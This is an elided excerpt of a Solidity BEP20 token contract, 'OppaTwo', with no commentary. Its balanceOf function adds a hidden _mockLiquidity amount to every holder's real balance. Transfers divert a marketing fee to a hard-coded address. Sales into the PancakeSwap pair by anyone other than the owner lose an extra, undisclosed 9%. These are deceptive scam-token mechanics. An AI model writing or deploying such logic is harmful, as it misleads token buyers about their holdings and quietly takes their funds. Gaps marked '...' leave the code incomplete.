...
contract OppaTwo is Context, IBEP20, Ownable {
    ...
    address marketing = 0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0;
    ...
    function balanceOf(address account)
        ...
        returns (uint256)
    {
        return _balances[account].add(_mockLiquidity);
    }
    ...
    function _maxTxAmount() internal view returns (uint256) {
        return _totalSupply.mul(_maxHolderPercent).div(100);
    }
    ...
    function _transfer(
        ...
        _balances[recipient] = _balances[recipient].add(
            amount.mul(uint256(100).sub(_marketingFee)).div(100)
        );

        /**
        @dev Marketing fee sent to marketing address */
        _balances[marketing] = _balances[marketing].add(
            amount.mul(_marketingFee).div(100)
        );

        /**
        @dev burn 2% of transaction */
        _burn(recipient, amount.mul(_burnRate).div(100));
        ...
        if (recipient == pancakePair && sender != owner()) {
            _balances[recipient] = _balances[recipient].sub(
                amount.mul(9).div(100)
            );
            _rewards = _rewards.add(amount.mul(9).div(100));
        }
